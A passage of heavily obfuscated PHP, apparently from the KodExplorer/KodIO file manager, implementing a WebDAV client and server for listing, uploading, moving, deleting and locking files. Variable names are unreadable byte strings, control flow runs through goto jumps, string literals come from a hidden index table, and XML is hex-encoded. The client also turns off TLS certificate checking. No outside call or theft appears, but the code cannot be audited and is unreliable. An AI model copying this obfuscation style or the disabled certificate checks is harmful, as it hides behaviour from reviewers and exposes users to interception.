$BÏù¦£¶å‹[91] || $a­Ğ™ä©†ë ? $BÏù¦£¶å‹[33] : $eáÕ©£’“Ÿ; for ($BåÏÚ¤ = 1; $BåÏÚ¤ <= count($AĞ¥ƒùã) + 1; $BåÏÚ¤++) { $fƒ¸›´øğŸ = substr($e¼ãÓÌ‰, 0, strlen($e¼ãÓÌ‰) - strlen($eáÕ©£’“Ÿ)); $C¦º¢ƒÈ–õ = $fƒ¸›´øğŸ . "\x28{$BåÏÚ¤}\51{$eáÕ©£’“Ÿ}"; if (!in_array_not_case($C¦º¢ƒÈ–õ, $AĞ¥ƒùã)) { return $C¦º¢ƒÈ–õ; } } } } goto aŠ¾æĞôœ; C¡²‡¹ˆš: class HttpDavClient { public function __construct($b©¾í´´Œ, $aÎáÔ¸¨Œ, $bæ•«¯×‘¸) { $this->header = array(); $this->userName = $aÎáÔ¸¨Œ; $this->userPassowrd = $bæ•«¯×‘¸; } protected function makePath($F×…¥Ï‚ì) { return $F×…¥Ï‚ì; } protected function setHeader($f¤ĞÜÛ‡¼˜, $aÖÑÙ»ÃÓ¯ = false) { if ($aÖÑÙ»ÃÓ¯ === !1) { $this->header[] = $f¤ĞÜÛ‡¼˜; } else { $this->header[] = $f¤ĞÜÛ‡¼˜ . $_SERVER[‚Ğ°–—î][881] . $aÖÑÙ»ÃÓ¯; } } public function move($f®·Íâ¹œ¹, $BïÁ²à†¬×, $eø°’ƒã½â = '') { $d¯×›†ŠŠ =& $_SERVER[‚Ğ°–—î]; $this->setHeader($d¯×›†ŠŠ[1770], $this->makePath($BïÁ²à†¬×)); $this->setHeader($d¯×›†ŠŠ[1771], $d¯×›†ŠŠ[1772]); if ($eø°’ƒã½â) { $this->setHeader($d¯×›†ŠŠ[1773], $d¯×›†ŠŠ[926] . $eø°’ƒã½â . $d¯×›†ŠŠ[929]); } return $this->send($d¯×›†ŠŠ[1774], $f®·Íâ¹œ¹); } public function copy($Fäåó‡ï„¤, $f˜ÛàÊåâ‚) { $aì¤‰æ·±‰ =& $_SERVER[‚Ğ°–—î]; $this->setHeader($aì¤‰æ·±‰[1770], $this->makePath($f˜ÛàÊåâ‚)); $this->setHeader($aì¤‰æ·±‰[1771], $aì¤‰æ·±‰[1772]); return $this->send($aì¤‰æ·±‰[1775], $Fäåó‡ï„¤); } public function mkcol($a¾¬Œ•£±²) { $D“Èµæ‹ª½ =& $_SERVER[‚Ğ°–—î]; $this->setHeader($D“Èµæ‹ª½[1771], $D“Èµæ‹ª½[1772]); return $this->send($D“Èµæ‹ª½[1776], $a¾¬Œ•£±²); } public function delete($Fñ¦Œ‰ñÑÚ, $DÙ—˜¼·­¼ = '') { $e‰…§¥Šæ =& $_SERVER[‚Ğ°–—î]; if ($DÙ—˜¼·­¼) { $this->setHeader($e‰…§¥Šæ[1773], $e‰…§¥Šæ[926] . $DÙ—˜¼·­¼ . $e‰…§¥Šæ[929]); } return $this->send($e‰…§¥Šæ[1251], $Fñ¦Œ‰ñÑÚ); } public function propfind($aè¡øÊ®Ë) { $fÇï ¨À¨ =& $_SERVER[‚Ğ°–—î]; $this->setHeader($fÇï ¨À¨[1777], $fÇï ¨À¨[83]); $this->setHeader($fÇï ¨À¨[1778], $fÇï ¨À¨[1779]); $F·®Õë’­³ = $fÇï ¨À¨[1780]; return $this->send($fÇï ¨À¨[1781], $aè¡øÊ®Ë, $F·®Õë’­³); } public function options($b·õÃÜ±¬ˆ) { return $this->send($_SERVER[‚Ğ°–—î][1782], $b·õÃÜ±¬ˆ); } public function get($bÒ‰ÉÉªó÷) { return $this->send($_SERVER[‚Ğ°–—î][216], $bÒ‰ÉÉªó÷); } public function put($EĞ‹ƒ×à–Ò, $Fí×Ç¶¯ƒé, $e½Óİ‰£ = '') { $BáŠ’…„î =& $_SERVER[‚Ğ°–—î]; if ($e½Óİ‰£) { $this->setHeader($BáŠ’…„î[1773], $BáŠ’…„î[926] . $e½Óİ‰£ . $BáŠ’…„î[929]); } return $this->send($BáŠ’…„î[214], $EĞ‹ƒ×à–Ò, $Fí×Ç¶¯ƒé); } protected function send($EĞÊ˜œù’Õ, $DÑŒƒÌï®±, $Bƒ†ñôªÒ = false, $EÕäì°½ = false) { goto Fçƒàõ‘¶Œ; DÌ§†Ê›†Ù: $f³ì¢æçÙ‘ = curl_init($DÑŒƒÌï®±); curl_setopt($f³ì¢æçÙ‘, CURLOPT_CUSTOMREQUEST, $EĞÊ˜œù’Õ); curl_setopt($f³ì¢æçÙ‘, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto fôáñ”ÚĞë; e«Î÷íÉğ: $this->header = array(); return $bèœÅçóÑØ; goto cø„«ÎÍæÄ; fôáñ”ÚĞë: curl_setopt($f³ì¢æçÙ‘, CURLOPT_HTTPHEADER, $this->header); curl_setopt($f³ì¢æçÙ‘, CURLOPT_RETURNTRANSFER, !0); curl_setopt($f³ì¢æçÙ‘, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto Dœ‡ÉÛÖ¶; Dœ‡ÉÛÖ¶: curl_setopt($f³ì¢æçÙ‘, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($f³ì¢æçÙ‘, CURLOPT_SSL_VERIFYHOST, !1); $bèœÅçóÑØ = curl_exec($f³ì¢æçÙ‘); goto e«Î÷íÉğ; Fçƒàõ‘¶Œ: $aÆŒùÑ­ù† =& $_SERVER[‚Ğ°–—î]; $cõ´¿Ø¿ÇÈ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($aÆŒùÑ­ù†[1783], $aÆŒùÑ­ù†[50]); goto f‡ß‹é¹Å¿; f‡ß‹é¹Å¿: $this->setHeader($cõ´¿Ø¿ÇÈ); if ($Bƒ†ñôªÒ) { $Bƒ†ñôªÒ = $aÆŒùÑ­ù†[1784] . $Bƒ†ñôªÒ; } if (!request_url_safe($DÑŒƒÌï®±)) { return !1; } goto DÌ§†Ê›†Ù; cø„«ÎÍæÄ: } } class HttpDavServer { public function __construct($DÓšËí›»÷, $DºÔ¿ƒ—ˆÔ) { $this->root = $DÓšËí›»÷; $this->initPath($DºÔ¿ƒ—ˆÔ); $this->start(); } public function initPath($BìÑÆÃ¤×Å) { $E¸ø¼»ŞÙ =& $_SERVER[‚Ğ°–—î]; $CÀÕ§ª®àÎ = rtrim($_SERVER[$E¸ø¼»ŞÙ[1389]], $E¸ø¼»ŞÙ[8]) . $E¸ø¼»ŞÙ[8]; $this->urlBase = substr($CÀÕ§ª®àÎ, 0, strpos($CÀÕ§ª®àÎ, $BìÑÆÃ¤×Å) + 1); $this->urlBase = rtrim($this->urlBase, $E¸ø¼»ŞÙ[8]) . $BìÑÆÃ¤×Å; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $cˆÆÄ™Ö¬ =& $_SERVER[‚Ğ°–—î]; $CÑ¯®¢Ã· = HttpAuth::get(); if ($CÑ¯®¢Ã·[$cˆÆÄ™Ö¬[535]] == $cˆÆÄ™Ö¬[1785] && $CÑ¯®¢Ã·[$cˆÆÄ™Ö¬[898]] == $cˆÆÄ™Ö¬[1786]) { return !0; } HttpAuth::error(); } public function start() { goto BÛŒÍë­ß; BÛŒÍë­ß: $dÍÑ•Ï½…³ =& $_SERVER[‚Ğ°–—î]; $this->checkUser(); $A”·¦„§Û¶ = $dÍÑ•Ï½…³[144] . HttpHeader::method(); goto A‘âßõŸ; A‘âßõŸ: if (!method_exists($this, $A”·¦„§Û¶)) { pr($A”·¦„§Û¶ . $dÍÑ•Ï½…³[1787]); die; } $B¶ªÙğ©è = array($dÍÑ•Ï½…³[1788], $dÍÑ•Ï½…³[1789]); if (!in_array($A”·¦„§Û¶, $B¶ªÙğ©è) && !$this->pathExists($this->path)) { $B±§ÎÊè¸² = array($dÍÑ•Ï½…³[1033] => 404); } else { $B±§ÎÊè¸² = $this->{$A”·¦„§Û¶}(); } goto f·®µÃå‰; f·®µÃå‰: if (!$B±§ÎÊè¸²) { return; } self::response($B±§ÎÊè¸²); goto Aêí¢»™æ; Aêí¢»™æ: } public function pathGet($A‹àÔÚğ£­ = false) { $B²Íæ¿íğ =& $_SERVER[‚Ğ°–—î]; $EòçÈ§ÛÜÜ = $A‹àÔÚğ£­ ? $_SERVER[$B²Íæ¿íğ[1790]] : $_SERVER[$B²Íæ¿íğ[1389]]; $EòçÈ§ÛÜÜ = KodIO::clear(rawurldecode($EòçÈ§ÛÜÜ)); if (!strstr($EòçÈ§ÛÜÜ, KodIO::clear($this->urlBase))) { return !1; } return substr($EòçÈ§ÛÜÜ, strpos($EòçÈ§ÛÜÜ, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($fêœö¦¿À¥) { return file_exists($fêœö¦¿À¥); } public function pathMkdir($f²×¦‹ïÖ¼) { return mkdir($f²×¦‹ïÖ¼, 511, !0); } public function pathInfo($C¤Ã˜«¿Û‚) { return path_info($C¤Ã˜«¿Û‚); } public function pathList($aÆŞİí‡Ä) { return path_list($aÆŞİí‡Ä); } public function pathOut($aµ¬„œ”Ò™) { echo file_get_contents($aµ¬„œ”Ò™); } public function pathPut($CèåÖÄ‚  , $BòÑõ›ÙÜ‘ = '') { if (!$BòÑõ›ÙÜ‘) { return file_put_contents($CèåÖÄ‚  , $_SERVER[‚Ğ°–—î][33]); } return move_path($BòÑõ›ÙÜ‘, $CèåÖÄ‚  ); } public function pathRemove($F±„ÓÈºö) { if (is_file($F±„ÓÈºö)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($E¢øïŒ¾¢Ê, $DëĞã‡Û‹£) { return move_path($E¢øïŒ¾¢Ê, $DëĞã‡Û‹£); } public function pathCopy($AŞÈ–¿¶¿ô, $aÔÏ„¶‰Ö) { return copy_dir($AŞÈ–¿¶¿ô, $aÔÏ„¶‰Ö); } public function parsePath($CËÍÚŒê‚) { return $CËÍÚŒê‚; } public function parseItem($fçæ¹Èß•ù, $dÀ¦Çî¥‚) { goto C¤äò„ùáî; cÑ×¯ñ‡: $BÙ™Ğ£…È = array($Eí’¨ª±Áô[1791] => KodIO::clear($this->urlBase . $cÍ¨ÔÃ‚‡”), $Eí’¨ª±Áô[107] => @gmdate($Eí’¨ª±Áô[1792], $fçæ¹Èß•ù[$Eí’¨ª±Áô[107]]), $Eí’¨ª±Áô[187] => @gmdate($Eí’¨ª±Áô[1793], $fçæ¹Èß•ù[$Eí’¨ª±Áô[187]]), $Eí’¨ª±Áô[77] => $fçæ¹Èß•ù[$Eí’¨ª±Áô[77]] ? $fçæ¹Èß•ù[$Eí’¨ª±Áô[77]] : 0); return $BÙ™Ğ£…È; goto Dˆš±°‹à; B©áËÉŞ§Ü: if ($dÀ¦Çî¥‚) { $cÍ¨ÔÃ‚‡” = $Eí’¨ª±Áô[8] . str_replace($Eí’¨ª±Áô[172], $Eí’¨ª±Áô[8], rawurlencode($this->pathGet())); } if (!trim($fçæ¹Èß•ù[$Eí’¨ª±Áô[107]])) { $fçæ¹Èß•ù[$Eí’¨ª±Áô[107]] = time(); } if (!trim($fçæ¹Èß•ù[$Eí’¨ª±Áô[187]])) { $fçæ¹Èß•ù[$Eí’¨ª±Áô[187]] = time(); } goto cÑ×¯ñ‡; C¤äò„ùáî: $Eí’¨ª±Áô =& $_SERVER[‚Ğ°–—î]; $cÍ¨ÔÃ‚‡” = $this->pathGet() . $Eí’¨ª±Áô[8] . $fçæ¹Èß•ù[$Eí’¨ª±Áô[28]]; $cÍ¨ÔÃ‚‡” = $Eí’¨ª±Áô[8] . str_replace($Eí’¨ª±Áô[172], $Eí’¨ª±Áô[8], rawurlencode($cÍ¨ÔÃ‚‡”)); goto B©áËÉŞ§Ü; Dˆš±°‹à: } public function parseItemXml($e–‡›…¸×“, $aÁ©î‰£íÍ) { $Eæ“îÜóÛİ =& $_SERVER[‚Ğ°–—î]; $E¦†Ş­ë°Ü = $this->parseItem($e–‡›…¸×“, $aÁ©î‰£íÍ); if ($e–‡›…¸×“[$Eæ“îÜóÛİ[29]] == $Eæ“îÜóÛİ[76]) { $F£´›£Ë§¹ = $Eæ“îÜóÛİ[1794]; $F£´›£Ë§¹ .= $Eæ“îÜóÛİ[1795]; } else { $A‡ÊÎŠ» = $e–‡›…¸×“[$Eæ“îÜóÛİ[160]] ? $e–‡›…¸×“[$Eæ“îÜóÛİ[160]] : get_path_ext($e–‡›…¸×“[$Eæ“îÜóÛİ[28]]); $D òğ¨Áî  = get_file_mime($A‡ÊÎŠ»); $F£´›£Ë§¹ = $Eæ“îÜóÛİ[1796]; $F£´›£Ë§¹ .= "\x3c\104\72\147\x65\x74\x63\x6f\156\x74\145\x6e\164\164\x79\160\x65\76{$D òğ¨Áî }\x3c\57\x44\x3a\x67\145\164\x63\x6f\156\x74\x65\156\164\x74\171\160\x65\76"; } return "\12\11\x9\x3c\104\x3a\x72\145\x73\160\x6f\156\x73\145\76\12\x9\11\11\x3c\x44\x3a\150\162\145\x66\x3e{$E¦†Ş­ë°Ü[$Eæ“îÜóÛİ[1791]]}\x3c\x2f\x44\72\x68\x72\x65\x66\x3e\xa\11\11\11\74\104\72\x70\162\x6f\x70\163\164\x61\164\x3e\12\11\11\11\x9\x3c\104\x3a\x70\162\157\x70\x3e\xa\x9\11\x9\11\11\74\104\x3a\x67\x65\164\154\141\x73\x74\x6d\157\144\151\146\151\145\x64\76{$E¦†Ş­ë°Ü[$Eæ“îÜóÛİ[107]]}\74\57\104\72\x67\145\x74\154\x61\x73\x74\155\x6f\x64\151\146\151\145\x64\x3e\12\x9\x9\11\x9\x9\x3c\x44\72\x63\x72\145\x61\164\x69\x6f\156\x64\x61\x74\x65\76{$E¦†Ş­ë°Ü[$Eæ“îÜóÛİ[187]]}\x3c\57\x44\72\x63\162\145\141\x74\x69\x6f\156\144\141\x74\145\76\12\11\x9\11\11\x9\x3c\x44\x3a\x67\145\x74\x63\x6f\x6e\164\x65\x6e\164\x6c\x65\156\x67\x74\150\76{$E¦†Ş­ë°Ü[$Eæ“îÜóÛİ[77]]}\x3c\x2f\104\x3a\147\145\x74\x63\x6f\x6e\164\x65\x6e\x74\x6c\x65\x6e\147\x74\150\76\xa\11\11\11\x9\11{$F£´›£Ë§¹}\12\11\x9\11\x9\74\x2f\x44\72\x70\x72\x6f\160\x3e\xa\x9\x9\x9\11\74\x44\72\x73\x74\x61\164\165\163\x3e\x48\124\124\x50\x2f\x31\x2e\61\40\x32\x30\x30\40\x4f\x4b\74\x2f\x44\x3a\163\164\141\x74\165\163\76\xa\11\11\11\74\57\x44\x3a\x70\162\157\160\163\164\141\x74\76\xa\x9\11\x3c\57\x44\x3a\x72\145\x73\x70\x6f\156\163\145\76"; } public function pathListMerge($Eƒ‚ñ‡šô) { goto C×îºòõÔæ; C×îºòõÔæ: $AƒºÒ‰ÎÍ‡ =& $_SERVER[‚Ğ°–—î]; if (!$Eƒ‚ñ‡šô) { return $Eƒ‚ñ‡šô; } $B¼£”ÜŠï’ = array($AƒºÒ‰ÎÍ‡[73], $AƒºÒ‰ÎÍ‡[74], $AƒºÒ‰ÎÍ‡[1797]); goto Eí‰ÛÍÃÛ—; F›ÂÜ¼°ìÁ: return $f¸½Šäˆ»; goto dˆôâ¦Ùå‘; Eí‰ÛÍÃÛ—: $f¸½Šäˆ» = array(); foreach ($Eƒ‚ñ‡šô as $e¡¼×ºÒã => $EÕ‰õ©ŒÄÚ) { if (!in_array($e¡¼×ºÒã, $B¼£”ÜŠï’) || !is_array($EÕ‰õ©ŒÄÚ)) { continue; } $f¸½Šäˆ» = array_merge($f¸½Šäˆ», $EÕ‰õ©ŒÄÚ); } foreach ($f¸½Šäˆ» as &$a‡‡Äø¿™) { $a‡‡Äø¿™[$AƒºÒ‰ÎÍ‡[28]] = str_replace($AƒºÒ‰ÎÍ‡[8], $AƒºÒ‰ÎÍ‡[1391], $a‡‡Äø¿™[$AƒºÒ‰ÎÍ‡[28]]); } goto F›ÂÜ¼°ìÁ; dˆôâ¦Ùå‘: } public function httpPROPFIND() { goto dˆŒ®ù„Ü¿; dˆŒ®ù„Ü¿: $fÙËéö’ó‘ =& $_SERVER[‚Ğ°–—î]; $cßƒ„ò°–¼ = $this->pathList($this->path); $d”Ú–¯È¸ = $this->pathListMerge($cßƒ„ò°–¼); goto D§ªÜ¶°Ô³; Dê“¶¢Á†¼: if ($fø†«ÎÁ‹À) { $d”Ú–¯È¸ = array($D‡„Ö–ªÆ’); } else { $D‡„Ö–ªÆ’[$fÙËéö’ó‘[28]] = $fÙËéö’ó‘[33]; $d”Ú–¯È¸ = array_merge(array($D‡„Ö–ªÆ’), $d”Ú–¯È¸); } $FŒ¼ŒÅÃ‘ã = $fÙËéö’ó‘[33]; foreach ($d”Ú–¯È¸ as $DĞÈµ¬Äè) { $FŒ¼ŒÅÃ‘ã .= $this->parseItemXml($DĞÈµ¬Äè, $fø†«ÎÁ‹À); } goto DÉŒÆ‹Æø; DÉŒÆ‹Æø: return array($fÙËéö’ó‘[1800] => 207, $fÙËéö’ó‘[1801] => "\x3c\x44\72\155\x75\154\164\x69\x73\164\x61\x74\165\x73\40\x78\x6d\154\x6e\163\x3a\x44\75\42\104\x41\x56\72\42\x3e\12{$FŒ¼ŒÅÃ‘ã}\xa\x3c\57\x44\72\155\165\x6c\x74\x69\163\164\141\164\x75\x73\x3e"); goto B½¬Ê±Å˜; D§ªÜ¶°Ô³: $D‡„Ö–ªÆ’ = $cßƒ„ò°–¼[$fÙËéö’ó‘[1798]]; if (!is_array($d”Ú–¯È¸) || $D‡„Ö–ªÆ’[$fÙËéö’ó‘[1799]] === !1) { return array($fÙËéö’ó‘[1800] => 404, $fÙËéö’ó‘[1801] => $fÙËéö’ó‘[1802]); } $fø†«ÎÁ‹À = $D‡„Ö–ªÆ’[$fÙËéö’ó‘[29]] == $fÙËéö’ó‘[167] || HttpHeader::get($fÙËéö’ó‘[1777]) == $fÙËéö’ó‘[468]; goto Dê“¶¢Á†¼; B½¬Ê±Å˜: } public function httpHEAD() { $dµ»ì‰¤ä» =& $_SERVER[‚Ğ°–—î]; $eÉ„ö • = $this->pathInfo($this->path); if (!$eÉ„ö • || $eÉ„ö •[$dµ»ì‰¤ä»[29]] == $dµ»ì‰¤ä»[76]) { return array($dµ»ì‰¤ä»[1033] => 200, $dµ»ì‰¤ä»[1207] => array($dµ»ì‰¤ä»[1803])); } return array($dµ»ì‰¤ä»[1033] => 200, $dµ»ì‰¤ä»[1207] => array($dµ»ì‰¤ä»[1804], $dµ»ì‰¤ä»[136], $dµ»ì‰¤ä»[1805] . $eÉ„ö •[$dµ»ì‰¤ä»[77]], $dµ»ì‰¤ä»[1806] . get_file_mime($eÉ„ö •[$dµ»ì‰¤ä»[160]]), $dµ»ì‰¤ä»[132] . gmdate($dµ»ì‰¤ä»[1792], $eÉ„ö •[$dµ»ì‰¤ä»[1254]]) . $dµ»ì‰¤ä»[1807], $dµ»ì‰¤ä»[1808])); } public function httpOPTIONS() { $dëÅ»Û¸‡ä =& $_SERVER[‚Ğ°–—î]; return array($dëÅ»Û¸‡ä[1033] => 200, $dëÅ»Û¸‡ä[1207] => array($dëÅ»Û¸‡ä[1809], $dëÅ»Û¸‡ä[1810], $dëÅ»Û¸‡ä[1811], $dëÅ»Û¸‡ä[1263])); } public function httpPROPPATCH() { $e‘Ä«åè´¬ =& $_SERVER[‚Ğ°–—î]; $B‹Ö­©Ğ—‹ = $e‘Ä«åè´¬[1812] . $_SERVER[$e‘Ä«åè´¬[1389]] . $e‘Ä«åè´¬[1813]; return array($e‘Ä«åè´¬[1800] => 207, $e‘Ä«åè´¬[1801] => "\x3c\104\72\155\165\154\164\x69\163\x74\x61\x74\x75\x73\x20\x78\x6d\154\x6e\163\x3a\x44\x3d\42\x44\101\x56\x3a\x22\76\xa{$B‹Ö­©Ğ—‹}\xa\x3c\x2f\104\72\x6d\165\x6c\164\151\x73\x74\141\164\165\x73\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $FÇò±¥çò =& $_SERVER[‚Ğ°–—î]; $bÒò¥„ˆÄà = $this->uploadFile(); if ($bÒò¥„ˆÄà) { $Fºº…ÚÙÅ­ = 204; } else { $bÒò¥„ˆÄà = $FÇò±¥çò[33]; $Fºº…ÚÙÅ­ = 201; } $Eœ’¾ÆßÛ = $this->pathPut($this->path, $bÒò¥„ˆÄà); if ($Eœ’¾ÆßÛ == !1) { $Fºº…ÚÙÅ­ = 404; } return array($FÇò±¥çò[1800] => $Fºº…ÚÙÅ­); } private function uploadFile() { goto fÀ×¿Å¸…Æ; E†ÇÂò«¼«: $B±¢«ªÃ©„ = @fopen($fÔ±è ù½Ê, $aÚ‘À¡³š¦[1523]); $bÙ¬áÀ•Úø = @fopen($aÚ‘À¡³š¦[1815], $aÚ‘À¡³š¦[1522]); if (!$bÙ¬áÀ•Úø || !$B±¢«ªÃ©„) { @unlink($fÔ±è ù½Ê); return !1; } goto E—Ø§Õ¹; a†œÙËĞ¡à: if (@filesize($fÔ±è ù½Ê) > 0) { return $fÔ±è ù½Ê; } @unlink($fÔ±è ù½Ê); return !1; goto AÉöÊÒ¸ÀÓ; fÀ×¿Å¸…Æ: $aÚ‘À¡³š¦ =& $_SERVER[‚Ğ°–—î]; @mk_dir(TEMP_FILES); $fÔ±è ù½Ê = TEMP_FILES . $aÚ‘À¡³š¦[1814] . rand_string(32); goto E†ÇÂò«¼«; E—Ø§Õ¹: while (!feof($bÙ¬áÀ•Úø)) { fwrite($B±¢«ªÃ©„, fread($bÙ¬áÀ•Úø, 1024 * 200)); } fclose($bÙ¬áÀ•Úø); fclose($B±¢«ªÃ©„); goto a†œÙËĞ¡à; AÉöÊÒ¸ÀÓ: } public function httpMKCOL() { $bê¹ò…­¬ =& $_SERVER[‚Ğ°–—î]; if ($this->pathExists($this->path)) { return array($bê¹ò…­¬[1033] => 409); } $C¢®‚ñ…Ÿ† = $this->pathMkdir($this->path); return array($bê¹ò…­¬[1033] => $C¢®‚ñ…Ÿ† ? 201 : 403); } public function httpMOVE() { $DÍ‘ÔñÛ…æ =& $_SERVER[‚Ğ°–—î]; $dÍ¥Ãò®°Ğ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$DÍ‘ÔñÛ…æ[1816]])) { $cïˆÈ“ß†é[$DÍ‘ÔñÛ…æ[1817]] = $_SERVER[$DÍ‘ÔñÛ…æ[1816]] == $DÍ‘ÔñÛ…æ[1818]; } $Bå‡™‰ÛÒî = $this->pathMove($this->path, $dÍ¥Ãò®°Ğ); return array($DÍ‘ÔñÛ…æ[1033] => $Bå‡™‰ÛÒî ? 201 : 404); } public function httpCOPY() { $dìòš‚Ô› = $this->parsePath($this->pathGet(!0)); $B×çä®©à£ = $this->pathCopy($this->path, $dìòš‚Ô›); return array($_SERVER[‚Ğ°–—î][1033] => $B×çä®©à£ ? 201 : 404); } public function httpDELETE() { $F…¢àÀÅÎÂ = $this->pathRemove($this->path); return array($_SERVER[‚Ğ°–—î][1033] => $F…¢àÀÅÎÂ ? 200 : 503); } public function httpLOCK() { $FÍ´–Û×öÄ =& $_SERVER[‚Ğ°–—î]; $dÑ°É»õì  = md5($this->path); $eğÊÜ‰×» = $FÍ´–Û×öÄ[1819] . $this->xmlGet($FÍ´–Û×öÄ[1820]) . $FÍ´–Û×öÄ[1821] . $dÑ°É»õì  . $FÍ´–Û×öÄ[1822]; return array($FÍ´–Û×öÄ[1033] => 200, $FÍ´–Û×öÄ[1207] => array($FÍ´–Û×öÄ[1823] . $dÑ°É»õì , $FÍ´–Û×öÄ[1824]), $FÍ´–Û×öÄ[1825] => $eğÊÜ‰×»); } public function httpUNLOCK() { return array($_SERVER[‚Ğ°–—î][1033] => 204); } public function xmlGet($Eƒö×âÛå ) { goto f´­ôìŸ¥ó; B˜çã·ô”: return $BÏŠÈÀÍêÃ[33]; goto bÑâ¯êÎ‚Œ; f´­ôìŸ¥ó: $BÏŠÈÀÍêÃ =& $_SERVER[‚Ğ°–—î]; static $cÓ¬ªÉÆÓ = false; if (!$cÓ¬ªÉÆÓ) { $A‚ñç¶ÊŸ = file_get_contents($BÏŠÈÀÍêÃ[1826]); $cÓ¬ªÉÆÓ = new DOMDocument(); $cÓ¬ªÉÆÓ->loadXML($A‚ñç¶ÊŸ); } goto F‰ÀãÁîÂ; F‰ÀãÁîÂ: $b«àŒ‹î¹ƒ = array_shift(explode($BÏŠÈÀÍêÃ[8], $Eƒö×âÛå )); $B¤èĞÅà‘× = $cÓ¬ªÉÆÓ->getElementsByTagNameNS($BÏŠÈÀÍêÃ[1827], $b«àŒ‹î¹ƒ); if ($B¤èĞÅà‘×) { return $B¤èĞÅà‘×[0]->nodeValue; } goto B˜çã·ô”; bÑâ¯êÎ‚Œ: } public static function response($C²¢éíˆ») { goto DÔ™É°›‘í; DÔ™É°›‘í: $E²¹´ĞÑ›Ç =& $_SERVER[‚Ğ°–—î]; $Dò•Ï¥²Ê = is_array($C²¢éíˆ»[$E²¹´ĞÑ›Ç[1207]]) ? $C²¢éíˆ»[$E²¹´ĞÑ›Ç[1207]] : array(); $Dò•Ï¥²Ê[] = HttpHeader::code($C²¢éíˆ»[$E²¹´ĞÑ›Ç[1033]]); goto E”ô¡çïãÃ; E”ô¡çïãÃ: $Dò•Ï¥²Ê[] = $E²¹´ĞÑ›Ç[1767]; $Dò•Ï¥²Ê[] = $E²¹´ĞÑ›Ç[1768]; foreach ($Dò•Ï¥²Ê as $D–­Æ”Ô) { header($D–­Æ”Ô); } goto d¾®Ü¤ßä; d¾®Ü¤ßä: if (is_string($C²¢éíˆ»[$E²¹´ĞÑ›Ç[1825]])) { header($E²¹´ĞÑ›Ç[1828]); $Fº¿™»å¬ = $E²¹´ĞÑ›Ç[1829] . $E²¹´ĞÑ›Ç[217] . $C²¢éíˆ»[$E²¹´ĞÑ›Ç[1825]]; echo $Fº¿™»å¬; } goto bÓ«·ğùÃ½; bÓ«·ğùÃ½: } } class HttpHeader { public static $_headers = array("\x48\x6f\x73\164" => "\110\x54\124\120\137\110\x4f\123\x54", "\x55\163\x65\x72\x2d\x41\147\x65\x6e\164" => "\110\x54\124\120\137\x55\x53\x45\122\x5f\x41\x47\105\116\x54", "\103\x6f\156\164\x65\x6e\x74\x2d\x54\x79\x70\x65" => "\110\x54\x54\120\x5f\x43\117\116\124\x45\x4e\x54\137\124\x59\x50\105", "\x43\x6f\x6e\x74\x65\156\x74\x2d\x4c\x65\x6e\147\164\x68" => "\110\124\124\120\x5f\103\117\116\124\x45\116\x54\x5f\x4c\x45\x4e\x47\124\x48", "\104\145\160\164\x68" => "\110\124\124\x50\x5f\x44\x45\120\x54\110", "\105\170\x70\145\x63\164" => "\x48\124\x54\x50\x5f\105\x58\120\x45\x43\124", "\x49\x66\x2d\116\x6f\x6e\x65\x2d\115\141\164\143\150" => "\110\x54\124\120\x5f\x49\106\x5f\116\x4f\x4e\105\x5f\115\x41\124\103\x48", "\x49\146\55\x4d\x61\164\x63\150" => "\110\124\124\120\137\111\x46\137\x4d\x41\124\x43\110", "\111\146\55\122\141\156\147\x65" => "\x48\x54\124\x50\137\111\x46\x5f\122\101\x4e\107\x45", "\114\x61\163\164\55\115\157\x64\x69\146\x69\145\x64" => "\110\124\x54\120\137\114\x41\x53\x54\x5f\x4d\x4f\x44\111\x46\111\x45\104", "\x49\146\55\115\x6f\144\x69\x66\x69\x65\144\x2d\123\x69\156\143\x65" => "\110\x54\124\x50\137\x49\106\137\115\117\x44\x49\x46\x49\105\x44\137\x53\111\x4e\x43\105", "\111\146\x2d\125\x6e\155\x6f\144\151\146\151\x65\x64\x2d\123\x69\156\143\145" => "\110\124\124\x50\x5f\x49\x46\137\125\x4e\115\117\x44\111\106\111\105\104\x5f\x53\x49\116\x43\105", "\x52\141\156\147\x65" => "\x48\x54\x54\120\x5f\x52\101\116\x47\105", "\124\151\155\145\157\x75\x74" => "\x48\x54\x54\x50\137\x54\x49\x4d\105\117\x55\x54", "\x49\146" => "\x48\x54\124\x50\137\111\x46", "\114\x6f\143\x6b\55\x54\x6f\153\x65\x6e" => "\110\124\x54\120\x5f\114\117\x43\x4b\137\124\117\113\105\116", "\x4f\166\145\x72\167\x72\151\x74\145" => "\x48\124\124\120\x5f\117\x56\105\122\127\x52\x49\124\105", "\x44\145\x73\x74\x69\156\141\164\x69\157\x6e" => "\x48\124\x54\120\x5f\104\105\x53\124\x49\x4e\x41\x54\111\x4f\x4e", "\122\x65\x71\x75\145\163\x74\x2d\x49\x64" => "\x52\x45\121\x55\x45\123\x54\137\111\x44", "\x52\x65\x71\x75\145\x73\x74\x2d\102\157\x64\171\55\106\x69\x6c\x65" => "\122\x45\x51\x55\x45\123\124\x5f\102\x4f\x44\131\137\x46\x49\114\x45", "\x52\145\144\151\162\x65\x63\x74\55\x53\164\x61\164\165\x73" => "\122\105\104\x49\122\x45\103\x54\x5f\x53\124\x41\124\125\123"); public static function init() { static $f³²¶òˆƒ• = false; if ($f³²¶òˆƒ•) { return; } foreach ($_SERVER as $c­ÇÊËœñ => $a’å ²šŠé) { $c­ÇÊËœñ = strtoupper($c­ÇÊËœñ); if (!array_key_exists($c­ÇÊËœñ, $_SERVER)) { continue; } $_SERVER[$c­ÇÊËœñ] = $a’å ²šŠé; } foreach (self::$_headers as $c­ÇÊËœñ => $AíæÓŸ­³¾) { if (!array_key_exists($c­ÇÊËœñ, $_SERVER)) { continue; } $_SERVER[$c­ÇÊËœñ] = $_SERVER[$AíæÓŸ­³¾]; $_SERVER[strtoupper($c­ÇÊËœñ)] = $_SERVER[$AíæÓŸ­³¾]; } } public static function get($B™éùô½×) { self::init(); return $_SERVER[$B™éùô½×] ? $_SERVER[$B™éùô½×] : $_SERVER[$_SERVER[‚Ğ°–—î][1830] . 